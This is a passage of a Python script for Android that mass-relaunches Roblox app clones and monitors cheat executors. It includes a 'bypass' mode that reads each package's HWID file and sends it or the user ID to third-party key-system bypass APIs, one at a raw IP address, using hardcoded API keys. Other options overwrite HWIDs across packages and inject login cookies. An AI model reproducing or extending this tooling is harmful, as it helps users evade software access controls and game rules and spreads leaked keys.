                        data = json.load(file)
                    except json.JSONDecodeError:
                        data = {}
                    data[user_id] = username
                    file.seek(0)
                    json.dump(data, file)
                    file.truncate()
    except (IOError, json.JSONDecodeError) as e:
        print(Fore.RED + f"An Error Occurred While Saving Username, Status Code Is: {e}" + Style.RESET_ALL)

def load_saved_username(user_id):
    try:
        with open("usernames.json", "r") as file:
            data = json.load(file)
            return data.get(user_id)
    except (FileNotFoundError, json.JSONDecodeError, IOError) as e:
        print(Fore.RED + f"An Error Occurred While Loading Username: {e}" + Style.RESET_ALL)
        return None
    
def load_cache():
    global username_cache
    if os.path.exists(CACHE_FILE):
        with open(CACHE_FILE, "r") as f:
            username_cache = json.load(f)

def save_cache():
    try:
        temp_file = CACHE_FILE + ".tmp"
        with open(temp_file, "w") as f:
            json.dump(username_cache, f)
        os.replace(temp_file, CACHE_FILE)  # Atomic move to replace the file
    except IOError as e:
        print(Fore.RED + f"Error saving cache: {e}" + Style.RESET_ALL)

def check_user_online(user_id):
    max_retries = 3
    delay = 2
    primary_url = "https://presence.roblox.com/v1/presence/users"
    headers = {'Content-Type': 'application/json'}
    body = {"userIds": [user_id]}

    with requests.Session() as session:
        for attempt in range(max_retries):
            try:
                primary_response = session.post(primary_url, headers=headers, json=body, timeout=7)
                primary_response.raise_for_status()
                
                primary_data = primary_response.json()
                user_presence = primary_data["userPresences"][0]
                primary_presence_type = user_presence["userPresenceType"]
                primary_last_location = user_presence.get("lastLocation", None)

                if primary_last_location == "Website":
                    print(Fore.YELLOW + f"{user_id} This User ID Is On Website And Not In Game, Rejoin Recommended." + Style.RESET_ALL)
                    primary_presence_type = 0  

                return primary_presence_type, primary_last_location

            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"An Error Occurred While Checking If The User Is Online Or Offline: {user_id} (Attempt {attempt + 1}): {e}" + Style.RESET_ALL)
                if attempt < max_retries - 1:
                    time.sleep(delay)
                    delay *= 2  # Exponential backoff
                else:
                    return None, None

def get_latest_file_path(directory):
    try:
        files = [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]

        if not files:
            print(Fore.RED + "File Not Found In Directory!" + Style.RESET_ALL)
            return None

        latest_file = max(files, key=lambda f: os.path.getmtime(os.path.join(directory, f)))
        return os.path.join(directory, latest_file)

    except (FileNotFoundError, OSError) as e:
        print(Fore.RED + f"Error Accessing Directory: {e}" + Style.RESET_ALL)
        return None

def get_hwid(package_name):
    directory = f"/data/data/{package_name}/app_assets/content/"
    
    hwid_file_path = get_latest_file_path(directory)
    
    if hwid_file_path:
        try:
            with open(hwid_file_path, "r") as file:
                hwid = file.read().strip()
                print(Fore.GREEN + f"Hwid Found, That is: {hwid}" + Style.RESET_ALL)
                return hwid
        except (FileNotFoundError, OSError) as e:
            print(Fore.RED + f"Error Reading HWID File: {e}" + Style.RESET_ALL)
            return None
    else:
        return None

# Function to create bypass link for Fluxus
def create_fluxus_bypass_link(hwid, api_key="XqzyaenZishd33axPYPz"):
    return f"https://madkung.vercel.app/fluxus-api?url=https://flux.li/android/external/start.php?HWID={hwid}&api_key={api_key}"
        
def create_bypass_link(user_id, api_key="shirrobeo"):
    return f"http://103.65.235.193:8264/api/delta?hwid_link=https://gateway.platoboost.com/a/8?id={user_id}&api_key={api_key}"

def decrement_time(time_str):
    hours, minutes = map(int, time_str.replace('H', '').replace('M', '').split())
    
    if minutes > 0:
        minutes -= 1
    elif hours > 0:
        hours -= 1
        minutes = 59
    else:
        # If it's already "0H 0M", it stays the same
        return "0H 0M"
    
    return f"{hours}H {minutes}M"

def bypass_user_ids(accounts, executor_choice, minutes_left_dict=None):
    bypassed_results = []

    for package_name, user_id_or_name in accounts:
        username = user_id_or_name if not user_id_or_name.isdigit() else get_username(user_id_or_name)

        try:
            if executor_choice == "1":  # Delta bypass
                if minutes_left_dict is not None:
                    if package_name not in minutes_left_dict or minutes_left_dict[package_name] == "0H 0M":
                        # Only send a request if minutes_left is not set or is zero or less
                        bypass_link = create_bypass_link(user_id_or_name)

                        try:
                            response = requests.get(bypass_link)
                            if response.status_code == 200:
                                result = response.json()
                                minutes_left = result.get('minutesLeft', '0H 0M')
                                minutes_left_dict[package_name] = minutes_left  # Store the minutes_left value
                                bypassed_results.append((package_name, result))

                                if minutes_left == "0H 0M":
                                    # Re-bypass immediately if minutes left is 0 or less
                                    response = requests.get(bypass_link)
                                    if response.status_code == 200:
                                        bypassed_results.append((package_name, response.json()))
                                        print(Fore.GREEN + f"{username}: Bypass successful with user ID API - {response.json()}" + Style.RESET_ALL)
                                    else:
                                        print(Fore.RED + f"{username}: Bypass failed with status code {response.status_code} using user ID API" + Style.RESET_ALL)
                                else:
                                    print(Fore.YELLOW + f"{username}: Minutes left: {minutes_left}" + Style.RESET_ALL)

                            else:
                                print(Fore.RED + f"{username}: Bypass failed with status code {response.status_code} using user ID API" + Style.RESET_ALL)
                        except Exception as e:
                            print(Fore.RED + f"{username}: Error using user ID API - {str(e)}" + Style.RESET_ALL)
                    else:
                        # Decrement the minutes_left by 1 minute using the decrement_time function
                        minutes_left_dict[package_name] = decrement_time(minutes_left_dict[package_name])
                        print(Fore.YELLOW + f"{username}: Waiting for {minutes_left_dict[package_name]} before rebypass..." + Style.RESET_ALL)

            elif executor_choice == "2":  # Fluxus bypass
                hwid = get_hwid(package_name)
                if hwid:
                    bypass_link = create_fluxus_bypass_link(hwid)
                    try:
                        response = requests.get(bypass_link)
                        if response.status_code == 200:
                            bypassed_results.append((package_name, response.json()))
                            print(Fore.GREEN + f"{username}: Fluxus Bypass successful - {response.json()}" + Style.RESET_ALL)
                        else:
                            print(Fore.RED + f"{username}: Fluxus Bypass failed with status code {response.status_code}" + Style.RESET_ALL)
                    except Exception as e:
                        print(Fore.RED + f"{username}: Error during Fluxus Bypass - {str(e)}" + Style.RESET_ALL)
                else:
                    print(Fore.RED + f"{username}: Failed to retrieve HWID for Fluxus" + Style.RESET_ALL)

        except Exception as bypass_error:
            print(Fore.RED + f"Error during bypass for {package_name}: {bypass_error}" + Style.RESET_ALL)
            # Continue with the rejoin process even if bypass fails.
            continue

    return bypassed_results

detect_and_write_lua_script()
        
# Main function to handle auto rejoin
def main():
    clear_screen() 
    load_config()  # Load configuration at the start
    load_cache()  # Load the cache at the start
    
    print_header()
    while True:
        clear_screen()  # Clear screen each time to avoid overlapping
        print_header()  # Always print the header

        # Dynamic menu options
        menu_options = [
            "Start Auto Rejoin",
            "Set User IDs for Each Package",
            "Same Game ID or Private Server Link",
            "Different Private Server or Game ID",
            "Clear User IDs and/or Server Links",
            "List",
            "Auto Setup User IDs",
            "Bypass Start",
            "Same HWID Fluxus",
            "Set Up Webhook",
            "Auto Login via Cookie",            
            "Exit"
        ]

        create_dynamic_menu(menu_options)  # Create the dynamic menu

        setup_type = input(Fore.LIGHTMAGENTA_EX + "Enter choice: " + Style.RESET_ALL)
        
        if setup_type == "1":
            server_links = load_server_links()
            accounts = load_accounts()

            if not accounts:
                print(Fore.RED + "No user IDs set up yet! Please set them up before proceeding." + Style.RESET_ALL)
                continue
            elif not server_links:
                print(Fore.RED + "No game ID or private server link set up yet! Please set them up before proceeding." + Style.RESET_ALL)
                continue

            try:
                force_rejoin_interval = int(input("Enter the force rejoin/kill Roblox interval in minutes: ")) * 60
                if force_rejoin_interval <= 0:
                    raise ValueError("The interval must be a positive integer.")
            except ValueError as ve:
                print(Fore.RED + f"Invalid input: {ve}. Please enter a valid interval in minutes." + Style.RESET_ALL)
                input(Fore.GREEN + "Press Enter to return to the menu..." + Style.RESET_ALL)
                continue

            if webhook_url and device_name and interval:
                if webhook_thread is None or not webhook_thread.is_alive():
                    start_webhook_thread()

            package_statuses = {}
            for package_name, server_link in server_links:
                package_statuses[package_name] = {
                    "Status": Fore.LIGHTCYAN_EX + "Initializing" + Style.RESET_ALL,
                    "Username": get_username(accounts[server_links.index((package_name, server_link))][1]),
                }

            update_status_table(package_statuses)

            # Kill Roblox processes and wait for 5 seconds
            kill_roblox_processes()
            time.sleep(5)

            num_packages = len(server_links)

            for package_name, server_link in server_links:
                try:
                    package_statuses[package_name]["Status"] = Fore.LIGHTCYAN_EX + "Launching" + Style.RESET_ALL
                    update_status_table(package_statuses)
                    launch_roblox(package_name, server_link, num_packages, package_statuses)
                    package_statuses[package_name]["Status"] = Fore.GREEN + "Joined" + Style.RESET_ALL

                    # Get the username for the executor check
                    username = get_username(accounts[server_links.index((package_name, server_link))][1])

                    # Reset the executor file before checking
                    reset_executor_file(username)

                    # Ensure the tool waits for the executor to load before proceeding to the next package
                    while True:
                        if check_executor_status(username, continuous=False):
                            package_statuses[package_name]["Status"] = Fore.GREEN + f"Executor loaded successfully for {username}" + Style.RESET_ALL
                            update_status_table(package_statuses)
                            break  # Break the loop and proceed to the next package

                        # If the executor failed to load within 2 minutes, rejoin and retry
                        else:
                            print(f"Executor did not load for {package_name} (username: {username}). Rejoining...")
                            package_statuses[package_name]["Status"] = Fore.RED + "Executor failed, rejoining..." + Style.RESET_ALL
                            update_status_table(package_statuses)
                            kill_roblox_process(package_name)
                            time.sleep(2)
                            launch_roblox(package_name, server_link, num_packages, package_statuses)

                except Exception as e:
                    # Handle subprocess or launch error
                    print(Fore.RED + f"Error launching Roblox for {package_name}: {e}" + Style.RESET_ALL)
                    package_statuses[package_name]["Status"] = Fore.RED + "Launch failed" + Style.RESET_ALL
                update_status_table(package_statuses)

            start_time = time.time()

            while True:
                current_time = time.time()

                try:
                    for package_name, user_id in accounts:
                        try:
                            # Retrieve the correct server_link for the package_name
                            server_link = get_server_link(package_name, server_links)
                            if not server_link:
                                package_statuses[package_name]["Status"] = Fore.RED + "Server link not found" + Style.RESET_ALL
                                update_status_table(package_statuses)
                                continue

                            # Get the username associated with the user ID or fallback to user ID
                            username = get_username_from_id(user_id)
                            presence_type, last_location_current = check_user_online(user_id)

                            package_statuses[package_name]["Username"] = username

                            if presence_type == 2:
                                package_statuses[package_name]["Status"] = Fore.GREEN + "In-Game" + Style.RESET_ALL
                                
                                if not check_executor_status(username, continuous=False):  # If executor isn't detected as working
                                    print(f"Executor did not update for {package_name} (username: {username}). Rejoining...")
                                    package_statuses[package_name]["Status"] = Fore.RED + "Executor failed, rejoining..." + Style.RESET_ALL
                                    update_status_table(package_statuses)
                                    kill_roblox_process(package_name)
                                    time.sleep(2)
                                    launch_roblox(package_name, server_link, num_packages, package_statuses)
                                    
                            else:
                                if not is_roblox_running(package_name):
                                    package_statuses[package_name]["Status"] = Fore.RED + "Process Crashed, Relaunching" + Style.RESET_ALL
                                    kill_roblox_process(package_name)
                                    time.sleep(2)
                                    launch_roblox(package_name, server_link, num_packages, package_statuses)
                                    
                                    # Check executor status after relaunch
                                    if not check_executor_status(username, continuous=False):
                                        print(f"Executor did not load for {package_name} (username: {username}) after relaunch. Rejoining...")
                                        package_statuses[package_name]["Status"] = Fore.RED + "Executor failed, rejoining..." + Style.RESET_ALL
                                        kill_roblox_process(package_name)
                                        time.sleep(2)
                                        launch_roblox(package_name, server_link, num_packages, package_statuses)
                                    
                                else:
                                    if last_location_current == "Website":
                                        package_statuses[package_name]["Status"] = Fore.RED + "On Website, Rejoining" + Style.RESET_ALL
                                        kill_roblox_process(package_name)
                                        time.sleep(2)
                                        launch_roblox(package_name, server_link, num_packages, package_statuses)

                                        # Check executor status after relaunch
                                        if not check_executor_status(username, continuous=False):
                                            print(f"Executor did not load for {package_name} (username: {username}) after relaunch. Rejoining...")
                                            package_statuses[package_name]["Status"] = Fore.RED + "Executor failed, rejoining..." + Style.RESET_ALL
                                            update_status_table(package_statuses)
                                            kill_roblox_process(package_name)
                                            time.sleep(2)
                                            launch_roblox(package_name, server_link, num_packages, package_statuses)

                                        # If executor loaded successfully after relaunch
                                        else:
                                            package_statuses[package_name]["Status"] = Fore.GREEN + "Executor loaded successfully after rejoin" + Style.RESET_ALL
                                            update_status_table(package_statuses)
                                    else:
                                        package_statuses[package_name]["Status"] = Fore.YELLOW + "Not In-Game, Recently Active" + Style.RESET_ALL

                            update_status_table(package_statuses)
                            time.sleep(25)  # Adjust the delay time as needed

                        except Exception as e:
                            print(Fore.RED + f"Error during rejoin process for {package_name}: {e}" + Style.RESET_ALL)
                            package_statuses[package_name]["Status"] = Fore.RED + "General error" + Style.RESET_ALL
                            update_status_table(package_statuses)

                    if current_time - start_time >= force_rejoin_interval:
                        print("Force killing Roblox processes due to time limit.")
                        kill_roblox_processes()
                        start_time = current_time
                        print(Fore.YELLOW + "Waiting for 5 seconds before starting the rejoin process..." + Style.RESET_ALL)
                        time.sleep(5)
                        for package_name, server_link in server_links:
                            try:
                                package_statuses[package_name]["Status"] = Fore.RED + "Rejoining" + Style.RESET_ALL
                                update_status_table(package_statuses)
                                launch_roblox(package_name, server_link, num_packages, package_statuses)
                                
                                # Check executor status after relaunch
                                if not check_executor_status(username, continuous=False):
                                    print(f"Executor did not load for {package_name} (username: {username}) after rejoin. Rejoining...")
                                    package_statuses[package_name]["Status"] = Fore.RED + "Executor failed, rejoining..." + Style.RESET_ALL
                                    kill_roblox_process(package_name)
                                    time.sleep(2)
                                    launch_roblox(package_name, server_link, num_packages, package_statuses)

                                package_statuses[package_name]["Status"] = Fore.GREEN + "Joined" + Style.RESET_ALL
                            except Exception as e:
                                print(Fore.RED + f"Error rejoining Roblox for {package_name}: {e}" + Style.RESET_ALL)

                        update_status_table(package_statuses)

                    time.sleep(90)

                except Exception as e:
                    print(Fore.RED + f"Critical error in auto rejoin loop: {e}" + Style.RESET_ALL)
                    time.sleep(60)
                    continue
            
        elif setup_type == "2":
            accounts = []
            packages = get_roblox_packages()

            for package_name in packages:
                user_input = input(f"Enter the user ID or username for {package_name}: ")
                user_id = None

                if user_input.isdigit():
                    user_id = user_input
                else:
                    print(f"Retrieving user ID for username: {user_input}...")
                    user_id = asyncio.run(get_user_id(user_input))
                    if user_id is None:
                        print(Fore.RED + "Failed to retrieve user ID. Please enter the user ID manually." + Style.RESET_ALL)
                        user_id = input("Enter the user ID: ")

                accounts.append((package_name, user_id))
                print(f"Set {package_name} to user ID: {user_id}")

            save_accounts(accounts)
            save_cache()
            print(Fore.GREEN + "User IDs saved!" + Style.RESET_ALL)

            input(Fore.GREEN + "\nPress Enter to exit..." + Style.RESET_ALL) 
            
        elif setup_type == "3":
            server_link = input("Enter the game ID or private server link: ")
            formatted_link = format_server_link(server_link)

            if formatted_link:
                packages = get_roblox_packages()
                server_links = [(package_name, formatted_link) for package_name in packages]
                save_server_links(server_links)
                print(Fore.GREEN + "Game ID or private server link saved successfully!" + Style.RESET_ALL)
                
            input(Fore.GREEN + "\nPress Enter to exit..." + Style.RESET_ALL)                 

        elif setup_type == "4":
            packages = get_roblox_packages()
            server_links = []

            for package_name in packages:
                server_link = input(f"Enter the game ID or private server link for {package_name}: ")
                formatted_link = format_server_link(server_link)

                if formatted_link:
                    server_links.append((package_name, formatted_link))

            save_server_links(server_links)  
            
            input(Fore.GREEN + "\nPress Enter to exit..." + Style.RESET_ALL) 
            
        elif setup_type == "5":
            clear_choice = input(Fore.GREEN + "What do you want to clear?\n1. Clear User IDs\n2. Clear Server Links\n3. Clear Both\nEnter choice: " + Style.RESET_ALL)

            if clear_choice == "1":
                if os.path.exists(ACCOUNTS_FILE):
                    os.remove(ACCOUNTS_FILE)
                    print(Fore.GREEN + "User IDs cleared successfully!" + Style.RESET_ALL)
                else:
                    print(Fore.YELLOW + f"No such file: '{ACCOUNTS_FILE}' found to clear." + Style.RESET_ALL)

            elif clear_choice == "2":
                if os.path.exists(SERVER_LINKS_FILE):
                    os.remove(SERVER_LINKS_FILE)
                    print(Fore.GREEN + "Server links cleared successfully!" + Style.RESET_ALL)
                else:
                    print(Fore.YELLOW + f"No such file: '{SERVER_LINKS_FILE}' found to clear." + Style.RESET_ALL)

            elif clear_choice == "3":
                if os.path.exists(ACCOUNTS_FILE):
                    os.remove(ACCOUNTS_FILE)
                    print(Fore.GREEN + "User IDs cleared successfully!" + Style.RESET_ALL)
                else:
                    print(Fore.YELLOW + f"No such file: '{ACCOUNTS_FILE}' found to clear." + Style.RESET_ALL)

                if os.path.exists(SERVER_LINKS_FILE):
                    os.remove(SERVER_LINKS_FILE)
                    print(Fore.GREEN + "Server links cleared successfully!" + Style.RESET_ALL)
                else:
                    print(Fore.YELLOW + f"No such file: '{SERVER_LINKS_FILE}' found to clear." + Style.RESET_ALL)
                    
            input(Fore.GREEN + "\nPress Enter to exit..." + Style.RESET_ALL) 
            
        elif setup_type == "6":
            accounts = load_accounts()
            server_links = load_server_links()

            if accounts and server_links:
                headers = ["Account", "Server", "Game ID", "Username"]
                rows = [(package, server, game_id, get_username(game_id)) for (package, game_id), (_, server) in zip(accounts, server_links)]
                create_dynamic_table(headers, rows)
            else:
                print(Fore.RED + "No accounts or server links to display." + Style.RESET_ALL)
            input(Fore.GREEN + "\nPress Enter to return to the menu..." + Style.RESET_ALL) 
        elif setup_type == "7":
            print(Fore.GREEN + "Auto Setup User IDs from each package's appStorage.json..." + Style.RESET_ALL)
            packages = get_roblox_packages()
            accounts = []

            for package_name in packages:
                file_path = f'/data/data/{package_name}/files/appData/LocalStorage/appStorage.json'
                user_id = find_userid_from_file(file_path)
                
                if user_id:
                    accounts.append((package_name, user_id))
                    print(f"Found UserId for {package_name}: {user_id}")
                else:
                    print(Fore.RED + f"UserId not found for {package_name}. Make sure the file path is correct and the format is as expected." + Style.RESET_ALL)

            save_accounts(accounts)
            save_cache()
            print(Fore.GREEN + "User IDs saved from appStorage.json!" + Style.RESET_ALL)

            # Prompt for server link
            server_link = input("Enter the game ID or private server link: ")
            formatted_link = format_server_link(server_link)

            if formatted_link:
                server_links = [(package_name, formatted_link) for package_name in packages]
                save_server_links(server_links)
                print(Fore.GREEN + "Game ID or private server link saved successfully!" + Style.RESET_ALL)
            input(Fore.GREEN + "\nPress Enter to exit..." + Style.RESET_ALL) 
            
        elif setup_type == "8":
            accounts = load_accounts()
            server_links = load_server_links()
            last_bypass_time = time.time()

            if not accounts:
                print(Fore.RED + "No user IDs set up yet! Please set them up before proceeding." + Style.RESET_ALL)
                continue

            try:
                force_rejoin_interval = int(input("Enter the force rejoin/kill Roblox interval in minutes: ")) * 60
                if force_rejoin_interval <= 0:
                    raise ValueError("The interval must be a positive integer.")
            except ValueError as ve:
                print(Fore.RED + f"Invalid input: {ve}. Please enter a valid interval in minutes." + Style.RESET_ALL)
                input(Fore.GREEN + "Press Enter to return to the menu..." + Style.RESET_ALL)
                continue

            print(Fore.GREEN + "Choose the executor:" + Style.RESET_ALL)
            print("1. Delta")
            print("2. Fluxus")
            executor_choice = input("Enter your choice (1-2): ")

            if executor_choice not in ["1", "2"]:
                print(Fore.RED + "Invalid choice. Please enter a valid option." + Style.RESET_ALL)
                continue

            minutes_left_dict = {} if executor_choice == "1" else None

            # Choose the bypass interval based on user input (only for Fluxus)
            bypass_interval = None
            if executor_choice == "2":
                print(Fore.GREEN + "Choose the bypass interval:" + Style.RESET_ALL)
                print("1. Every 30 minutes")
                print("2. Every 1 hour")
                print("3. Every 2 hours")
                print("4. Every 12 hours")
                interval_choice = input("Enter your choice (1-4): ")
                bypass_interval_mapping = {
                   '1': 30 * 60,  # 30 minutes in seconds
                   '2': 60 * 60,  # 1 hour in seconds
                   '3': 2 * 60 * 60,  # 2 hours in seconds
                   '4': 12 * 60 * 60  # 12 hours in seconds
                }
                bypass_interval = bypass_interval_mapping.get(interval_choice)
                if not bypass_interval:
                    print(Fore.RED + "Invalid choice. Please enter a valid option." + Style.RESET_ALL)
                    continue

            package_statuses = {}
            for package_name, _ in server_links:
                package_statuses[package_name] = {
                    "Status": Fore.LIGHTCYAN_EX + "Initializing" + Style.RESET_ALL,
                    "Username": get_username(accounts[server_links.index((package_name, _))][1]),
                }

            update_status_table(package_statuses)  # Initial table update

            if executor_choice == "1":
                # Bypass the user IDs using Delta
                for package_name, user_id in accounts:
                    try:
                        if package_name not in minutes_left_dict or minutes_left_dict[package_name] == "0H 0M":
                            bypassed_links = bypass_user_ids([(package_name, user_id)], "1", minutes_left_dict)
                            if bypassed_links:
                                package_statuses[package_name]["Status"] = Fore.GREEN + "Delta Bypass successful" + Style.RESET_ALL
                            else:
                                package_statuses[package_name]["Status"] = Fore.RED + "Failed to bypass using Delta" + Style.RESET_ALL
                        else:
                            print(Fore.YELLOW + f"{package_name}: Waiting for {minutes_left_dict[package_name]} minutes before rebypass..." + Style.RESET_ALL)
                    except Exception as e:
                        package_statuses[package_name]["Status"] = Fore.RED + f"Error during Delta Bypass: {e}" + Style.RESET_ALL
                    update_status_table(package_statuses)

            elif executor_choice == "2":
                for package_name, user_id in accounts:
                    hwid = get_hwid(package_name)
                    if hwid:
                        bypass_link = create_fluxus_bypass_link(hwid)
                        try:
                            response = requests.get(bypass_link)
                            if response.status_code == 200:
                                bypass_result = response.json()
                                package_statuses[package_name]["Status"] = Fore.GREEN + "Fluxus Bypass successful" + Style.RESET_ALL
                            else:
                                package_statuses[package_name]["Status"] = Fore.RED + f"Fluxus Bypass failed with status code {response.status_code}" + Style.RESET_ALL
                        except Exception as e:
                            package_statuses[package_name]["Status"] = Fore.RED + f"Error during Fluxus Bypass: {e}" + Style.RESET_ALL
                    else:
                        package_statuses[package_name]["Status"] = Fore.RED + "Failed to retrieve HWID" + Style.RESET_ALL
                    update_status_table(package_statuses)

            # Start webhook if configured
            if webhook_url and device_name and interval:
                if webhook_thread is None or not webhook_thread.is_alive():
                    start_webhook_thread()

            # Kill Roblox processes and wait for 5 seconds
            print("Killing Roblox processes...")
            kill_roblox_processes()
            print(Fore.YELLOW + "Waiting for 5 seconds before starting the rejoin process..." + Style.RESET_ALL)
            time.sleep(5)
            num_packages = len(server_links)

            # Launch Roblox and check executor for each package
            for package_name, server_link in server_links:
                try:
                    # Launch Roblox
                    launch_roblox(package_name, server_link, num_packages, package_statuses)

                    # Get the username for the executor check
                    username = get_username(accounts[server_links.index((package_name, server_link))][1])

                    # Check if executor is loaded, if not, rejoin
                    reset_executor_file(username)

                    # Ensure the tool waits for the executor to load before proceeding to the next package
                    while True:
                        if check_executor_status(username, continuous=False):
                            package_statuses[package_name]["Status"] = Fore.GREEN + f"Executor loaded successfully for {username}" + Style.RESET_ALL
                            update_status_table(package_statuses)
                            break  # Break the loop and proceed to the next package

                        # If the executor failed to load within 2 minutes, rejoin and retry
                        else:
                            print(f"Executor did not load for {package_name} (username: {username}). Rejoining...")
                            package_statuses[package_name]["Status"] = Fore.RED + "Executor failed, rejoining..." + Style.RESET_ALL
                            update_status_table(package_statuses)
                            kill_roblox_process(package_name)
                            time.sleep(2)
                            launch_roblox(package_name, server_link, num_packages, package_statuses)

                except Exception as e:
                    # Handle subprocess or launch error
                    print(Fore.RED + f"Error launching Roblox for {package_name}: {e}" + Style.RESET_ALL)
                    package_statuses[package_name]["Status"] = Fore.RED + "Launch failed" + Style.RESET_ALL
                update_status_table(package_statuses)

            start_time = time.time()
            last_bypass_time = start_time

            try:
                while True:
                    current_time = time.time()

                    for package_name, user_id in accounts:
                        username = get_username(user_id) or user_id
                        presence_type, last_location_current = check_user_online(user_id)

                        package_statuses[package_name]["Username"] = username

                        if presence_type == 2:
                            package_statuses[package_name]["Status"] = Fore.GREEN + "In-Game" + Style.RESET_ALL
                            
                            if not check_executor_status(username, continuous=False):  # If executor isn't detected as working
                                print(f"Executor did not update for {package_name} (username: {username}). Rejoining...")
                                package_statuses[package_name]["Status"] = Fore.RED + "Executor failed, rejoining..." + Style.RESET_ALL
                                update_status_table(package_statuses)
                                kill_roblox_process(package_name)
                                time.sleep(2)
                                launch_roblox(package_name, server_link, num_packages, package_statuses)
                                
                        else:
                            if not is_roblox_running(package_name):
                                package_statuses[package_name]["Status"] = Fore.RED + "Process Crashed, Relaunching" + Style.RESET_ALL
                                kill_roblox_process(package_name)
                                time.sleep(2)
                                launch_roblox(package_name, server_link, num_packages, package_statuses)
                                
                                # Check executor status after relaunch
                                if not check_executor_status(username, continuous=False):
                                    print(f"Executor did not load for {package_name} (username: {username}) after relaunch. Rejoining...")
                                    package_statuses[package_name]["Status"] = Fore.RED + "Executor failed, rejoining..." + Style.RESET_ALL
                                    kill_roblox_process(package_name)
                                    time.sleep(2)
                                    launch_roblox(package_name, server_link, num_packages, package_statuses)

                                # If executor loaded successfully after relaunch
                                else:
                                    if last_location_current == "Website":
                                        package_statuses[package_name]["Status"] = Fore.RED + "On Website, Rejoining" + Style.RESET_ALL
                                        kill_roblox_process(package_name)
                                        time.sleep(2)
                                        launch_roblox(package_name, server_link, num_packages, package_statuses)

                                        # Check executor status after relaunch
                                        if not check_executor_status(username, continuous=False):
                                            print(f"Executor did not load for {package_name} (username: {username}) after relaunch. Rejoining...")
                                            package_statuses[package_name]["Status"] = Fore.RED + "Executor failed, rejoining..." + Style.RESET_ALL
                                            update_status_table(package_statuses)
                                            kill_roblox_process(package_name)
                                            time.sleep(2)
                                            launch_roblox(package_name, server_link, num_packages, package_statuses)

                                        # If executor loaded successfully after relaunch
                                        else:
                                            package_statuses[package_name]["Status"] = Fore.GREEN + "Executor loaded successfully after rejoin" + Style.RESET_ALL
                                            update_status_table(package_statuses)
                                    else:
                                        package_statuses[package_name]["Status"] = Fore.YELLOW + "Not In-Game, Recently Active" + Style.RESET_ALL

                        update_status_table(package_statuses)
                        time.sleep(25)  # Adjust the delay time as needed

                    if executor_choice == "1":  # Delta
                        # Check remaining time and rebypass if needed
                        for package_name, user_id in accounts:
                            bypass_results = bypass_user_ids(accounts, "1", minutes_left_dict)
                            for _, result in bypass_results:
                                minutes_left = result.get('minutesLeft', "0H 0M")
                                if minutes_left == "0H 0M":
                                    package_statuses[package_name]["Status"] = Fore.RED + "Bypassing Now..." + Style.RESET_ALL
                                    update_status_table(package_statuses)
                                    bypass_user_ids(accounts, "1", minutes_left_dict)  # Rebypass immediately if minutes left is 0 or less
                        update_status_table(package_statuses)

                    if executor_choice == "2" and current_time - last_bypass_time >= bypass_interval:
                        print("Performing Fluxus bypass operation...")
                        bypass_results = bypass_user_ids(accounts, "2")  # No need to pass minutes_left_dict
                        last_bypass_time = current_time

                    time.sleep(90)  # Wait 90 seconds before the next loop iteration

                    if current_time - start_time >= force_rejoin_interval:
                        print("Force killing Roblox processes due to time limit.")
                        kill_roblox_processes()
                        start_time = current_time
                        print(Fore.YELLOW + "Waiting for 5 seconds before starting the rejoin process..." + Style.RESET_ALL)
                        time.sleep(5)
                        for package_name, server_link in server_links:
                            try:
                                package_statuses[package_name]["Status"] = Fore.RED + "Rejoining" + Style.RESET_ALL
                                update_status_table(package_statuses)
                                launch_roblox(package_name, server_link, num_packages, package_statuses)
                                
                                # Check executor status after relaunch
                                if not check_executor_status(username, continuous=False):
                                    print(f"Executor did not load for {package_name} (username: {username}) after rejoin. Rejoining...")
                                    package_statuses[package_name]["Status"] = Fore.RED + "Executor failed, rejoining..." + Style.RESET_ALL
                                    kill_roblox_process(package_name)
                                    time.sleep(2)
                                    launch_roblox(package_name, server_link, num_packages, package_statuses)

                                package_statuses[package_name]["Status"] = Fore.GREEN + "Joined" + Style.RESET_ALL
                            except Exception as e:
                                print(Fore.RED + f"Error rejoining Roblox for {package_name}: {e}" + Style.RESET_ALL)

                        update_status_table(package_statuses)

            except Exception as e:
                print(Fore.RED + f"Critical error in bypass process: {e}" + Style.RESET_ALL)
                time.sleep(60)
                continue
            
        elif setup_type == "9":
            new_hwid = input("Enter the new HWID you want to set for all Fluxus packages: ")

            # Fetch the Fluxus packages
            packages = get_roblox_packages()

            # Iterate over each package and update the HWID
            for package_name in packages:
                hwid_file_path = get_hwid_file_path(package_name)
                if hwid_file_path:
                    try:
                        with open(hwid_file_path, "w") as file:
                            file.write(new_hwid)
                        print(Fore.GREEN + f"HWID for {package_name} successfully updated to {new_hwid}" + Style.RESET_ALL)
                    except Exception as e:
                        print(Fore.RED + f"Error updating HWID for {package_name}: {e}" + Style.RESET_ALL)
                else:
                    print(Fore.RED + f"Failed to find HWID file for {package_name}. Skipping." + Style.RESET_ALL)

            input(Fore.GREEN + "\nPress Enter to return to the menu..." + Style.RESET_ALL)
            
        elif setup_type == "10":
            setup_webhook()

        elif setup_type == "11":  # Auto Login via Cookie
            inject_cookies_and_appstorage()
            input(Fore.GREEN + "\nPress Enter to exit..." + Style.RESET_ALL) 
            
        elif setup_type == "12":
            global stop_webhook_thread
            stop_webhook_thread = True  # Stop the webhook thread if it is running
            break 

if __name__ == "__main__":
    load_cache()  # Load the cache at the start
    main()  # Run the main function
    save_cache()  # Save the cache before exiting
